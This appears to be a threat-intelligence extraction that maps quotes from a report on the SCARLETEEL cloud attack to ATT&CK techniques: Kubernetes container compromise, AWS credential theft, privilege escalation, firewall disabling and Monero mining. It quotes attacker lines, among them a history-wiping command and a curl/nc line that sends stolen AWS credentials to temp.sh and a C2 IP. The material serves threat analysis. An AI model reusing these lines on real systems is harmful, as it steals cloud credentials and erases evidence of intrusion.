techniques.evidence_quote: After exploiting some JupyterLab notebook containers deployed in a Kubernetes cluster, the SCARLETEEL operation proceeded with multiple types of attacks.

techniques.technique_name: Command and Scripting Interpreter: Unix Shell
techniques.evidence_quote: the actor leveraged several versions of scripts that steal credentials... it uses shell built-ins to accomplish this instead of curl.
this script runs an Alpine Docker image installing static-curl in it.
Using the new admin privileges, the adversary created new users and a new set of access keys for all the users in the account, including admins.
One of the users created was called 'aws_support' which they switched to in order to conduct reconnaissance.
the actor discovered and exploited a customer mistake in an AWS policy which allowed them to escalate privileges to AdministratorAccess and gain control over the account

techniques.technique_name: Impair Defenses: Disable or Modify System Firewall
techniques.evidence_quote: It starts deleting the current IPtables rules and sets the firewall to make them fully permissive.

history -cw
clear
the script removes the evidences of the attack, calling the notraces() bash function

techniques.technique_name: Match Legitimate Resource Name or Location
techniques.evidence_quote: The Monero miner is executed in background using the names for containered and the systemd service as a defense evasion technique

By using the '--endpoint-url' option, they did not send the API requests to the default AWS services endpoints, but instead to hb.bizmrg.com... These requests were not logged in the victim's CloudTrail
Those scripts search for AWS credentials in different places: by contacting the instance metadata (both IMDSv1 and IMDSv2)
The get_aws_data() function also searches for credentials in all Docker containers in the target machine (even if they are not running) and in the filesystem
they started to use the other new accounts created or the account compromised to achieve the same purposes by stealing secrets from Secret Manager

the SCARLETEEL actor started conducting automated reconnaissance in the victim's AWS environment. After some failed attempts to run EC2 instances, they tried to create access keys for all admin users.
The 'get secrets', 'get pods' and 'get namespaces' APIs called in the screenshot below are part of the execution of peirates.
they tried to create access keys for all admin users. The victim used a specific naming convention for all of their admin accounts similar to 'adminJane,' 'adminJohn,' etc.
they configured the keys for the Russian S3 environment with the 'configure' command and then attempted to access their buckets.
Looking at the exfiltration function, we can see that it sends the Base64 encoded stolen credentials to the C2 IP Address.
SEND_AWS_DATA_CURL=$(curl --upload-file $CSOF https://temp.sh)... SEND_AWS_DATA_NC=$(cat $CSOF | nc 5.39.93.71 9999)

With the admin access, the attacker created 42 instances of c5.metal/r5a.4xlarge in the compromised account... our conservative estimate is that their mining would have cost over $4,000 per day until stopped.
they also downloaded and executed Pandora, a malware belonging to the Mirai Botnet... responsible for many large-scale DDoS attacks
